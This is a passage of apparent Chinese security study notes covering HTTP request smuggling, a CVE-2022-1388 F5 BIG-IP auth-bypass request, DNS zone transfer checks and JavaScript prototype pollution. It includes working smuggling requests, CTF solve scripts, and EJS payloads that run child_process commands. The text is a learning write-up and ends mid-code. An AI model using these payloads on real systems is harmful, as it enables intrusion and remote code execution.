0 GET /post?postId=5 HTTP/1.1 User-Agent: \u0026#34;\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; Content-Type: application/x-www-form-urlencoded Content-Length: 5 x=1 只需要发送一次，之后任意访问页面都会弹窗，因为我们的请求嵌入到上面第二个请求中\n修改重定向 目标在使用 30x 跳转的时候，使用了 Host 头进行跳转，例如在 Apache \u0026amp; IIS 服务器上，一个uri 最后不带 / 的请求会被 30x 导向带 / 的地址，例如发送以下请求：\nGET /home HTTP/1.1 Host: normal-website.com 我们会得到 Response :\nHTTP/1.1 301 Moved Permanently Location: https://normal-website.com/home/ 看起来没什么危害，但是如果我们配合 HTTP Smuggling 就会有问题了，例如：\nPOST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 54 Transfer-Encoding: chunked 0 GET /home HTTP/1.1 Host: attacker-website.com Foo: X Smugle 之后的请求会像以下这样：\nGET /home HTTP/1.1 Host: attacker-website.com Foo: XGET /scripts/include.js HTTP/1.1 Host: vulnerable-website.com 然后如果服务器根据 Host 进行跳转的话，我们会得到以下的 Response:\nHTTP/1.1 301 Moved Permanently Location: https://attacker-website.com/home/ 这样，受害者，也就是访问/scripts/include.js这个的用户，会被跳转到我们控制的 url\n缓存投毒 https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning\n基于上面的Host跳转的攻击场景，当前端服务器还存在缓存静态资源时可以配合smuggling进行缓存投毒\n在/post/next?postId=2的路由处有一个跳转的api供我们使用，这个路由跳转到/post?postId=4\n我们选择/resources/js/tracking.js进行投毒\nPOST / HTTP/1.1 Host: ac7a1f141fadd93d801c469f005500bf.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=f6c7ZBB52a6iedorGSywc8jM6USu4685 Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Type: application/x-www-form-urlencoded Content-Length: 178 Transfer-Encoding: chunked 0 GET /post/next?postId=3 HTTP/1.1 Host: ac701fe61fabd97b8027465701f800a8.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 10 x=1 之后再访问/resources/js/tracking.js会跳转到我们走私请求的url/post?postId=4，再访问正常主页就会alert\n在C请求的/resources/js/tracking.js会被前端服务器认为是静态资源缓存起来，而我们利用HTTP Smuggling将这个请求导向了我们的vps，返回了alert(1)给C请求，然后这个响应包就会被前端服务器缓存起来，这样我们就成功进行了投毒\n缓存欺骗 在缓存投毒中，攻击者将恶意内容存储在缓存中 并将该内容从缓存中提供给其它应用程序用户，而在缓存欺骗中，攻击者使应用程序将一些属于另一个用户的敏感内容存储在缓存中，然后攻击者从缓存中检索该内容\n我们发送这样的请求\nPOST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 43 Transfer-Encoding: chunked 0 GET /private/messages HTTP/1.1 Foo: X smuggle的请求会用Foo:X覆盖下一个发过来的请求头的第一行（GET /xxx HTTP/1.1） 并且这个请求会带着用户的cookie去访问，类似CSRF，该请求就会变成这样\nGET /private/messages HTTP/1.1 Foo: XGET /static/some-image.png HTTP/1.1 Host: vulnerable-website.com Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z 多发送几次，一旦用户访问的是静态资源，就可能会被前端服务器缓存起来，我们就可以拿到用户/private/messages的信息了\nin CTF [BuckeyeCTF 2021]Curly fries file-link\n用c的curl.h库实现curl的功能，接收一个我们输入的url，curl之后返回响应包的内容，看下c源码\n#include \u0026lt;curl/curl.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int verify_flag_file() { // Verify that the flag file still contains the flag char* buf = malloc(1024); FILE* fp = fopen(\u0026#34;./flag.txt\u0026#34;, \u0026#34;r\u0026#34;); fgets(buf, 1024, fp); int res = strstr(buf, \u0026#34;Congratulations! Here\u0026#39;s the flag: buckeye{\u0026#34;) == buf; free(buf); return res; } char* response = NULL; size_t response_buf_size = 0; size_t response_size = 0; size_t header_callback(char* data, size_t size, size_t nitems, void* userdata) { size_t real_size = size * nitems; printf(\u0026#34;\u0026lt; %.*s\u0026#34;, (int)real_size, data); if (strstr(data, \u0026#34;Content-Length\u0026#34;) == data || strstr(data, \u0026#34;content-length\u0026#34;) == data) { // 检查CL头 并不严谨 __attribute__((unused)) char* name = strtok(data, \u0026#34; \u0026#34;); size_t content_length = atol(strtok(NULL, \u0026#34; \u0026#34;)); // 注意 依据CL值分配缓冲区的大小 if (response) { // 如果有先释放 free(response); } response_buf_size = content_length + 1; response = (char*)malloc(response_buf_size); // 分配响应缓冲区大小为CL+1 } return real_size; } size_t write_callback(void* data, size_t size, size_t nitems, void* userdata) { size_t real_size = size * nitems; if (response_size + real_size \u0026gt; response_buf_size - 1) { response_buf_size = response_size + real_size + 1; response = (char*)realloc(response, response_buf_size); } memcpy(response + response_size, data, real_size); response_size += real_size; return real_size; } int main() { setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL); char url[64]; printf(\u0026#34;Enter a URL and I\u0026#39;ll curl it: \u0026#34;); fgets(url, 64, stdin); url[strcspn(url, \u0026#34;\\n\u0026#34;)] = 0; if (!verify_flag_file()) { fprintf(stderr, \u0026#34;ERROR! flag.txt may have been tampered with!\\n\u0026#34;); return 3; } CURL* curl = curl_easy_init(); if (curl) { curl_easy_setopt(curl, CURLOPT_URL, url); curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L); curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, header_callback); curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback); curl_easy_setopt(curl, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); CURLcode res = curl_easy_perform(curl); if (res == CURLE_OK) { if (response) { response[response_buf_size] = 0; puts(response); free(response); } } else { fprintf( stderr, \u0026#34;curl_easy_perform() failed: %s\\n\u0026#34;, curl_easy_strerror(res)); } curl_easy_cleanup(curl); } return 0; } 注意header_callback检查CL头的时候用strstr函数，意味着我们可以用Content-Lengthw: 1023这样的头来给response分配1023+1=1024的空间\n理论上来说，malloc应该在verify_flag_file的地方及时地释放掉含有flag的部分并且正确给出response，但是根据doc - the curl docs for the write callback，传入的数据并没有空字符作为终止符，而题目puts(response)的内容会到response_buf的末尾，也就是1024大小\n最后，response中前16字节是空字节，我们需要在发送16字符让它们变为非空\nimport socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((\u0026#39;0.0.0.0\u0026#39;, 6969)) s.listen() conn, addr = s.accept() print(\u0026#39;Accepted connection.\u0026#39;) with conn: data = b\u0026#39;\u0026#39; while not data.endswith(b\u0026#39;\\r\\n\\r\\n\u0026#39;): data += conn.recv(1) print(data) conn.sendall( b\u0026#39;HTTP/1.1 200 OK\\r\\n\u0026#39; b\u0026#39;Content-Lengthw: 1023\\r\\n\u0026#39; b\u0026#39;\\r\\n\u0026#39; + b\u0026#39;a\u0026#39;*16 ) s.close() 严格来说这并不是smuggling的问题，最多是涉及到TE\nThere was a use after free on the buffer the flag was stored in. If you could get the binary to re-allocate another 1024-length buffer and not fill it in, it will contain the flag that was originally read into the \u0026ldquo;flag validity checking\u0026rdquo; buffer.\n虽然还是有一点点不太懂\n[BuckeyeCTF 2021]sozu 这下是正经的smuggling问题了\nfrom pwn import * import ssl hostname = \u0026#39;sozu.chall.pwnoh.io\u0026#39; ctx = ssl.create_default_context() #ctx.check_hostname = False #ctx.verify_mode = ssl.CERT_NONE sock = socket.create_connection((hostname, 13380)) ssock = ctx.wrap_socket(sock, server_hostname=hostname) r = remote(hostname, \u0026#34;13380\u0026#34;, sock=ssock) # The solution here is the tab after \u0026#39;chunked\u0026#39;. # sozu will use content-length, gunicorn will use # chunked. # You do actually need another request after getting # the flag, otherwise you won\u0026#39;t get the response back #r = remote(\u0026#34;localhost\u0026#34;, \u0026#34;3000\u0026#34;) r.send(\u0026#34;\u0026#34;\u0026#34;POST /public/testing HTTP/1.1\\r Host: sozu.chall.pwnoh.io\\r Connection: keep-alive\\r transfer-encoding: chunked\\t\\r content-length: 60\\r \\r 2\\r hi\\r 0\\r \\r GET /internal/flag HTTP/1.1\\r Host: localhost\\r \\r GET /public/test HTTP/1.1\\r Host: sozu.chall.pwnoh.io\\r \\r \u0026#34;\u0026#34;\u0026#34;) r.interactive() 不知名题 https://hg8.sh/posts/misc-ctf/request-smuggling/\n正常的响应包提示Server: gunicorn/19.9.0，当访问/results时 有一个HAProxy Authentication，所以web部分应该是这样的架构\nUser | | +-----+-----+ | | | HAProxy | | | +-----+-----+ | | +---------+----------+ +-------------+ | | | | | Gunicorn | | Web App | | WSGI HTTP Server +-----+ Python (?) | | | | | +--------------------+ +-------------+ 前端的服务器是HAProxy，后端的是gunicorn，所以我们尝试smuggling，夹带一个/results的请求，让它不被前端服务器HAProxy解析 直接转发给后端的gunicorn\n尝试这样的请求\nPOST / HTTP/1.1 Host: misc.ctf:33433 Content-Length: 6 Transfer-Encoding: chunked 0 X 正常情况下前端的HAProxy会这样转发给后端的gunicorn\nPOST / HTTP/1.1 Host: misc.ctf:33433 Transfer-Encoding: chunked X-Forwarded-For: 172.21.0.1 0 可以注意到末尾的X因为CL的原因而被丢掉 并且忽略了TE，我们smuggling是需要TE的，尝试这样修改\nPOST / HTTP/1.1 Host: misc.ctf:33433 Content-Length: 13 Transfer-Encoding:[\\x0b]chunked 0 SMUGGLED 转发后是这样\nPOST / HTTP/1.1 Host: misc.ctf:33433 Content-Length: 13 Transfer-Encoding: chunked X-Forwarded-For: 172.21.0.1 0 SMUGGLED 成功走私了内容\n直接放最后的payload\nPOST / HTTP/1.1 Host: misc.ctf:33433 Content-Length: 39 Content-Type: application/x-www-form-urlencoded Transfer-Encoding:�chunked 1 A 0 GET /results HTTP/1.1 Foo: xGET / HTTP/1.1 $ printf \u0026#34;POST / HTTP/1.1\\r\\nHost: misc.ctf:33433\\r\\nContent-Length: 39\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nTransfer-Encoding:^Lchunked\\r\\n\\r\\n1\\r\\nA\\r\\n0\\r\\n\\r\\nGET /results HTTP/1.1\\r\\nFoo: xGET / HTTP/1.1\\r\\n\\r\\n\u0026#34; | nc misc.ctf:33433 HTTP/1.1 400 BAD REQUEST Server: gunicorn/19.9.0 Date: Thu, 04 Jun 2020 17:41:32 GMT Content-Type: text/html; charset=utf-8 Content-Length: 192 \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 3.2 Final//EN\u0026#34;\u0026gt; \u0026lt;title\u0026gt;400 Bad Request\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Bad Request\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The browser (or proxy) sent a request that this server could not understand.\u0026lt;/p\u0026gt; HTTP/1.1 200 OK Server: gunicorn/19.9.0 Date: Thu, 04 Jun 2020 17:41:32 GMT Content-Type: text/html; charset=utf-8 Content-Length: 30 flag{r3KW35t 5mu99L1N9 12 8Ad} 修复 使用HTTP/2 加入了Request multiplexing over a single TCP connection，减少TCP连接复用的可能性\n前后端服务器一致 禁用代理服务器与后端服务器之间的TCP连接复用 hop-by-hop headers abuse 根据RFC 2612，为了区分请求中代理是否存cache的行为，把请求头区分为以下两种\nend-to-end 必须贯穿请求始终\nhop-by-hop 当请求中遇到这些请求头，一个正常的proxy不会把这些信息带到下一个hop内；默认hop-by-hop有这些\nConnection Keep-Alive Proxy-Authenticate Proxy-Authorization TE Trailers Transfer-Encoding Upgrade 除此之外还可以自定义请求头加入hop-by-hop的行列中，只需把它放入Connection字段中即可\nConnection: close, X-Foo, X-Bar 由此导致的hop-by-hop头滥用可能会导致一些逻辑错误\n如上图所示，正常proxy处理会在原始请求的下一跳（转移到代理）中移除hop-by-hop列表中的头，利用这种特性，在Connection中被添加的头会被移除，有这样几种利用思路：删除XFF头隐藏IP、缓存中毒DoS、SSRF、绕过WAF\n由删header导致的权限提升漏洞有CVE-2021-32813，修复方案就是BIG-IP同款的set，还有栗子和栗子2\nCVE-2022-1388 将鉴权用的X-F5-Auth-Token头放入Connection中让其在被转发至后端服务器时被删掉，从而绕过鉴权\nPOST /mgmt/tm/util/bash Authorization: Basic YWRtaW46 X-F5-Auth-Token: a Connection: Keep-alive, X-F5-Auth-Token { \u0026#34;command\u0026#34;:\u0026#34;run\u0026#34;, \u0026#34;utilCmdArgs\u0026#34;:\u0026#34;-c id\u0026#34; } 更多java代码层的分析详见天河师傅的这篇\n首先是当X-F5-Auth-Token为空时走入另一条验证流程，而这个流程依赖于我们给header提供的Authorization:字段。因为Authorization字段可控，并且没有复杂的加密处理，从而导致可以轻易绕过鉴权。\n以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（ HTTP请求切分出处paper\nburp详解\n一篇文章带你读懂 HTTP Smuggling 攻击\ncve-2018-8004\n不知名题\nBIG-IP(CVE-2022-1388)从修复方案分析出exp\nCVE-2022-1388漏洞分析\nAbusing HTTP hop-by-hop request headers\n","date":"2022-05-21T23:09:24+08:00","permalink":"https://amiaaaz.github.io/2022/05/21/hrs-and-hop-by-hop-request-header-abuse-study-notes/","section":"posts","tags":[],"title":"HTTP请求走私攻击\u0026Hop-By-Hop请求头利用学习笔记"},{"categories":["NOTES\u0026SUMMARY"],"contents":"DNS服务器提供域名解析的基础性服务，可以细分为主服务器、备份服务器、缓存服务器，备份服务器会从主服务器中拷贝数据来更新自己的数据库，而这个同步的过程中就需要用到DNS域传送，一旦配置不当，就可能会导致任何匿名用户都可以获取DNS服务器某一域的所有记录，泄露重要信息\n漏洞成因 在域传送中关键的配置项有这两个\nallow-transfer {ipaddress;}; 通过ip限制可进行域传送的服务器 allow-transfer { key transfer; }; 通过key限制可进行域传送的服务器 有两种设置方式，options或是zone，默认优先级为zone 如果为空则遵循options，示例\noptions { listen-on { 1.1.1.1; }; listen-on-v6 { any; }; directory \u0026#34;/bind\u0026#34;; pid-file \u0026#34;/bind/run/pid\u0026#34;; dump-file \u0026#34;/bind/data/named_dump.db\u0026#34;; statistics-file \u0026#34;/bind/data/named.stats\u0026#34;; allow-transfer { any; }; allow-query {any;}; }; zone \u0026#34;wooyun.org\u0026#34; { type master; file \u0026#34;/bind/etc/wooyun.org.conf\u0026#34;; allow-transfer {any;}; }; 如果没有手动添加allow-transfer来限制获取记录的来源，就会存在DNS域传送漏洞\n检测方式 dig / linux 以vulhub为例，以常规的8.8.8.8作为DNS服务器进行解析，如果发送axfr的请求会failed\n如果使用存在漏洞的DNS服务器进行查询，则会返回域内所有的字域、A记录和CNAME等信息\nnslookup / windows\u0026amp;linux 正常情况：\n存在漏洞的情况（linux示例）：\nNmap nmap -script dns-zone-transfer -script-args dns-zone-transfer.domain=vulhub.org -p 53 -Pn 172.27.0.2 dnsrecon dnsrecon -d example.com dnsenum dnsenum example.com 以下是本文中涉及到的 和我学习时看过的所有文章的链接 每日感谢互联网的丰富资源（ 浅析DNS域传送漏洞\nDNS域传送信息泄露\nvulhub复现环境\n","date":"2022-05-06T16:52:58+08:00","permalink":"https://amiaaaz.github.io/2022/05/06/dns-zone-transfer-study-note/","section":"posts","tags":["PENTEST"],"title":"DNS域传送漏洞学习"},{"categories":["NOTES\u0026SUMMARY"],"contents":"学的时候随手记录的，可能有很多错误，见谅（\n参考链接统一在文末\n基本定义 prototype\u0026amp;__proto__ js中定义类需要通过定义构造函数的方式进行\nfunction Foo() { this.bar = 1 } new Foo() Foo函数的内容就是Foo类的构造函数，而this.bar是Foo类的一个属性；除了定义了值的普通属性我们还可以将方法定义到构造函数内部\nfunction Foo() { this.bar = 1 this.show = function(){ console.log(this.bar) } } (new Foo()).show() 可是这样的写法会造成一个问题，即每当我们新建一个Foo对象时，this.show = function()这样的代码就会执行一次，show方法被绑定在对象上而不是类中；我们希望创建类时只创建一次show方法，这时候需要使用原型prototype\nfunction Foo() { this.bar = 1 } Foo.prototype.show = function show() { console.log(this.bar) } let foo = new Foo() foo.show() prototype是类Foo的一个属性，而所有用Foo类实例化的对象都将拥有这个属性中的全部内容（包括变量和方法），比如上述代码中的foo对象可以直接调用show方法/函数\n我们是通过Foo.prototype来访问Foo类的原型，但经过Foo实例化的对象是不能通过.prototype来访问原型的，而是借助__proto__\n经由类实例化而来的对象可以通过.__proto__来访问对应类的原型，即\nfoo.__proto__ == Foo.prototype 所以总结两点\n类自带prototype属性，经由类实例化来的对象会自动带上prototype中的属性和方法 经由类实例化而来的对象可以通过.__proto__来访问对应类的原型 经由类实例化而来的对象可以通过.constructor来获取构造这个实例的本来的函数 constructor function Dog(name) { this.name = name } Dog.prototype.sayHi = function() { console.log(\u0026#39;I am\u0026#39;, this.name) } let d = new Dog(\u0026#39;yo\u0026#39;) d.sayHi() // I am yo console.log(d.constructor) // [Function: Dog] 最后一行，d.constructor可以返回构造这个实例的本来的函数\nfunction test(){} console.log(test.constructor)\t// [Function: Function] console.log(test.constructor === Function.constructor)\t// true 任意一个函数的contructor，都将会返回Function.constructor，而它可以用来构造函数\n利用这一点，我们可以用任意内建函数来构造新的函数了\nvar f1 = [].map.constructor(\u0026#39;console.log(123)\u0026#39;) var f2 = Math.min.constructor(\u0026#39;console.log(456)\u0026#39;) f1()\t// 123 f2()\t// 456 甚至\u0026hellip;\u0026hellip;..也不是不可以嘛\nvar f3 = (1).constructor.constructor(\u0026#39;console.log(\u0026#34;abc\u0026#34;)\u0026#39;)() f3()\t// abc 同理，[]，''，{}都是可以的，单独的()不行 得有数字\n原型链\u0026amp;继承 这么好的两个特性被用来实现js的继承机制，举个例子\nfunction Father(){ this.firstName = \u0026#39;Lao\u0026#39; this.lastName = \u0026#39;Wang\u0026#39; } function Son(){ this.firstName = \u0026#39;Ming\u0026#39; } Son.prototype = new Father() let son = new Son() console.log(`Name: ${son.firstName} ${son.lastName}`) // Name: Ming Wang son.lastName被调用后查找lastName有一个顺序\n对象son son.__proto__ son.__proto__.__proto__ son.__proto__.__proto__.__proto__ son.__proto__.__proto__.__proto__.__proto__ -\u0026gt; NULL 结束 就是js这个在面向对象的继承中使用的查找机制，被称作原型继承链\n————注意在这个查找的过程中并没有出现prototype，而是通过xyz.__proto__来暴露prototype，真正参与查找的 是对象的__proto__\n另外，对于继承的表达方式除了.还有[]，后者一般在属性名是动态时使用，两种表达方式是一样的\n原型链污染 既然foo.__proto__ == Foo.prototype，那修改前者是否能直接影响类呢？\n首先需要注意的：\nWhat\u0026rsquo;s good to note about this property is that it\u0026rsquo;s implemented as a getter/setter property which invokes getPrototypeOf/setPrototypeOf on read/write. So assigning a new value to the property \u0026ldquo;_proto_\u0026rdquo; doesn\u0026rsquo;t shadow the inherited value defined on the prototype. The only way to shadow it invovles using \u0026ldquo;Object.defineProperty\u0026rdquo;.\n要注意，只是这样的修改并不足以污染原型链，只是修改当前运行状态下这个对象的属性而已，还要再向上找一级__proto__\n一个正常的栗子\n我们通过foo.__proto__.bar修改的是foo的原型，当修改之后调用foo.bar由于查找顺序的原因并没有立即修改值，而继承自{}的zoo对象，其bar属性已经被污染了\n综上，如果我们可以控制并修改一个对象的原型，就可以影响所有和这个对象来自同一类、父祖类的对象，这就是原型链污染\n应用场景 常用的两种修改方式\nobj[a][b] = value: obj[__proto__][modify_property] = value obj[a][b][c] = value: obj[constructor][prototype][modify_property] = value 在什么情况下我们可以设置__proto__的值呢？我们找能控制数组（对象）的键名的操作即可\nObject recursive merge Object clone Property defination by path 对象merge操作 function merge(target, source){ for(let key in source){ if(key in source \u0026amp;\u0026amp; key in target){ merge(target[key], source[key])\t// ! }else{ target[key] = source[key] } } } 在第四行的赋值过程中，如果key == '__proto__'是否会造成原型链污染呢？\nlet o1 = {} let o2 = {a: 1, \u0026#34;__proto__\u0026#34;: {b: 2}} merge(o1, o2) console.log(o1.a, o1.b) o3 = {} console.log(o3.b) 虽然merge成功了，但是原型链被没有受到污染\n原因是因为我们在let o2 = {a: 1, \u0026quot;__proto__\u0026quot;: {b: 2}}创建o2时，实际的两个键名是a, b而不是a, __proto__，__proto__就不是一个key，自然也不会修改Object的原型（看起来很奇怪，但是就是这样\n让它被认做一个键名需要修改一下创建o2的方式let o2 = JSON.parse('{\u0026quot;a\u0026quot;: 1, \u0026quot;__proto__\u0026quot;: {\u0026quot;b\u0026quot;: 2}}')\n在JSON解析的情况下__proto__被认作是键名而不是原型，所以成功了\n由传入参数定义对象属性 function theFunc(object, path, value){ object.path = value } 如果path和value的值可以被我们指定，我们可以设定path = \u0026quot;__proto__.myValue\u0026quot;，之后指定value的值\n具体操作可见后面的CVE-2019-10795(undefsafe)，lodash.set\n对象clone操作 Prototype pollution can happen with API that clone object when the API implements the clone as recursive merge on an empty object. Do note that merge function must be affected by the issue.\nfunction clone(obj){ return merge({}, obj) } 攻击实现 奈何不是很好归类，如果按攻击方式归类的话会出现重复的模块和不好分类的地方，呜呜呜呜呜呜，好乱\n对象merge操作 lodash.mergeWith 类似lodash.merge，多接收一个参数customizer\nmergeWith(object, sources, [customizer]); 如果是undefined就跟merge一样了\nvar lodash= require(\u0026#39;lodash\u0026#39;); var payload = \u0026#39;{\u0026#34;__proto__\u0026#34;:{\u0026#34;whoami\u0026#34;:\u0026#34;Vulnerable\u0026#34;}}\u0026#39;; var a = {}; console.log(\u0026#34;Before whoami: \u0026#34; + a.whoami); lodash.mergeWith({}, JSON.parse(payload)); console.log(\u0026#34;After whoami: \u0026#34; + a.whoami); 由传入参数定义对象属性 lodash.set set(object, path, value); 设置值到对象对应的属性路径上\nvar lodash= require(\u0026#39;lodash\u0026#39;); var object_1 = { \u0026#39;a\u0026#39;: [{ \u0026#39;b\u0026#39;: { \u0026#39;c\u0026#39;: 3 } }] }; var object_2 = {} console.log(object_1.whoami); // undefined lodash.set(object_2, \u0026#39;__proto__.[\u0026#34;whoami\u0026#34;]\u0026#39;, \u0026#39;Vulnerable\u0026#39;); console.log(object_1.whoami); // Vulnerable lodash.setWith setWith(object, path, value, [customizer]) POC\nvar lodash= require(\u0026#39;lodash\u0026#39;); var object_1 = { \u0026#39;a\u0026#39;: [{ \u0026#39;b\u0026#39;: { \u0026#39;c\u0026#39;: 3 } }] }; var object_2 = {} console.log(object_1.whoami); // undefined lodash.setWith(object_2, \u0026#39;__proto__.[\u0026#34;whoami\u0026#34;]\u0026#39;, \u0026#39;Vulnerable\u0026#39;); console.log(object_1.whoami); // Vulnerable lodash.defaultsDeep/CVE-2019-10744 const mergeFn = require(\u0026#39;lodash\u0026#39;).defaultsDeep; const payload = \u0026#39;{\u0026#34;constructor\u0026#34;: {\u0026#34;prototype\u0026#34;: {\u0026#34;a0\u0026#34;: true}}}\u0026#39; function check() { mergeFn({}, JSON.parse(payload)); if (({})[`a0`] === true) { console.log(`Vulnerable to Prototype Pollution via ${payload}`); } } check(); 污染toString\u0026amp;valueOf方法造成500 express-fileupload - CVE-2020-7699 版本要求：express-fileupload \u0026lt; 1.1.8; parseNested = true express-fileupload模块可为express应用提供文件上传功能，该漏洞可引发DOS，配合EJS等模板引擎可以达到rce\nnpm i express-fileupload@1.1.7-alpha.4 定位到关键代码\n当parseNested为ture，就会实现processNested方法，与上文提到的merge方法很类似，但是他会对传入的字典进行一个离谱的分析，当我们传入\n{\u0026#34;a.b.c\u0026#34;: \u0026#34;whoami\u0026#34;} 返回的是\n{ a: { b: { c: \u0026#39;whoami\u0026#39; } } } 那我们要是传入\n{\u0026#34;__proto__.toString\u0026#34;:\u0026#34;whoami\u0026#34;} 可以看到我们雀食把Object对象的toString方法给污染为了whoami\n一个完整的栗子\nconst express = require(\u0026#39;express\u0026#39;) const fileupload = require(\u0026#39;express-fileupload\u0026#39;) const app = express() app.use(fileupload({parseNested: true})) app.get(\u0026#39;/\u0026#39;, (req, res)=\u0026gt;{ res.end(\u0026#39;express-fileupload poc\u0026#39;) }) var server = app.listen(3000, function (){ var host = server.address().address var port = server.address().port console.log(\u0026#39;url: http://%s:%s/\u0026#39;, host, port) }) poc\nPOST / HTTP/1.1 Host: 192.168.18.1:3000 Content-Type: multipart/form-data; boundary=--------1566035451 Content-Length: 134 ----------1566035451 Content-Disposition: form-data; name=\u0026#34;__proto__.toString\u0026#34;; filename=\u0026#34;filename\u0026#34; whoami ----------1566035451-- 之后再次刷新我们的http页面\n已经成功崩坏了\nundefsafe - CVE-2019-10795 版本要求：Undefsafe \u0026lt; 2.0.3 这个模块的核心是一个用来处理访问对象属性不存在时的报错相关逻辑的函数\nnpm i undefsafe@2.0.2 先简单测试模块使用，首先是用undefined解决烦人的长调用栈报错\nvar undefsafe = require(\u0026#39;undefsafe\u0026#39;) var object = { a:{ b:{ c:1, d:[1,2,3], e:\u0026#39;amiz\u0026#39; } } } console.log(object.a.b.e) // amiz console.log(a(object, \u0026#39;a.b.e\u0026#39;)) // amiz console.log(object.a.c.e) // TypeError: Cannot read property \u0026#39;e\u0026#39; of undefined // ..... console.log(undefsafe(object, \u0026#39;a.c.e\u0026#39;)) // undefined 然后是简易赋值\nconsole.log(object) //{ a: { b: { c: 1, d: [Array], e: \u0026#39;amiz\u0026#39; } } } undefsafe(object, \u0026#39;a.b.e\u0026#39;, \u0026#39;123\u0026#39;) console.log(object) // { a: { b: { c: 1, d: [Array], e: \u0026#39;123\u0026#39; } } } 但如果我们访问的属性不存在\nconsole.log(object) //{ a: { b: { c: 1, d: [Array], e: \u0026#39;amiz\u0026#39; } } } undefsafe(object, \u0026#39;a.f.e\u0026#39;, \u0026#39;123\u0026#39;) console.log(object) // { a: { b: { c: 1, d: [Array], e: \u0026#39;amiz\u0026#39; }, e: \u0026#39;123\u0026#39; } } 它会直接给你摞起来，看起来肥肠的奇怪\ndemo1.js\nvar undefsafe = require(\u0026#39;undefsafe\u0026#39;) var object = { a:{ b:{ c:1, d:[1,2,3], e:\u0026#39;amiz\u0026#39; } } } var payload = \u0026#34;__proto__.toString\u0026#34; undefsafe(object, payload, \u0026#34;whoami\u0026#34;) console.log(object.toString) // whoami 当传入的后两个参数可控时可以污染object对象\ndemo2.js\ntest = {} console.log(\u0026#39;this is \u0026#39; + test) // this is [object Object] undefsafe(test, \u0026#39;__proto__.toString\u0026#39;, function (){return \u0026#39;evil code\u0026#39;}) console.log(\u0026#39;this is \u0026#39; + test) // this is evil code 将对象和字符串拼接时自动调用toString，但是test对象中没有，于是到test.__proto__中寻找，找到了toString并调用，而此时toString已经被污染\n结合模板引擎RCE的实例 express-fileupload - CVE-2020-7699 版本要求：express-fileupload \u0026lt; 1.1.8; parseNested = true 同样是这个版本的express-fileupload，还可以结合ejs模板实现RCE\nserver.js\nconst express = require(\u0026#39;express\u0026#39;) const fileupload = require(\u0026#39;express-fileupload\u0026#39;) const app = express() app.use(fileupload({parseNested: true})) app.get(\u0026#39;/\u0026#39;, (req, res)=\u0026gt;{ console.log(Object.prototype.polluted) res.render(\u0026#39;index.ejs\u0026#39;) }) var server = app.listen(3000, function (){ var host = server.address().address var port = server.address().port console.log(\u0026#39;url: http://%s:%s/\u0026#39;, host, port) }) index.ejs\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;%= message%\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; poc\nPOST / HTTP/1.1 Host: 192.168.18.1:3000 Content-Type: multipart/form-data; boundary=--------1566035451 Content-Length: 202 ----------1566035451 Content-Disposition: form-data; name=\u0026#34;__proto__.outputFunctionName\u0026#34;; _tmp1;global.process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;calc\u0026#39;);var __tmp2 ----------1566035451-- 与上面相同，发送poc后刷新页面即可弹计算器\nlodash.merge 版本要求：lodash \u0026lt; 4.17.11; 4.17.4之后过滤关键词__proto__，可用Object.constructor.prototype进行绕过 server.js\nvar express = require(\u0026#39;express\u0026#39;); var lodash = require(\u0026#39;lodash\u0026#39;); var ejs = require(\u0026#39;ejs\u0026#39;); var app = express(); //设置模板的位置与种类 app.set(\u0026#39;views\u0026#39;, __dirname); app.set(\u0026#39;views engine\u0026#39;,\u0026#39;ejs\u0026#39;); //对原型进行污染 __proto__.xxx var malicious_payload = \u0026#39;{\u0026#34;__proto__\u0026#34;:{\u0026#34;outputFunctionName\u0026#34;:\u0026#34;_tmp1;global.process.mainModule.require(\\\u0026#39;child_process\\\u0026#39;).exec(\\\u0026#39;calc\\\u0026#39;);var __tmp2\u0026#34;}}\u0026#39;; // 4.17.4之后版本进行`__proto__`过滤 使用Object.constructor.prototype绕过 // var malicious_payload = \u0026#39;{\u0026#34;Object\u0026#34;:{\u0026#34;constructor\u0026#34;:{\u0026#34;prototype\u0026#34;:{\u0026#34;outputFunctionName\u0026#34;: \u0026#34;_tmp1;global.process.mainModule.constructor._load(\\\u0026#39;child_process\\\u0026#39;).execSync(\\\u0026#39;calc\\\u0026#39;);var __tmp2\u0026#34;}}}}\u0026#39; lodash.merge({}, JSON.parse(malicious_payload)); //进行渲染 app.get(\u0026#39;/\u0026#39;, function (req, res) { res.render (\u0026#34;index.ejs\u0026#34;,{ message: \u0026#39;whoami 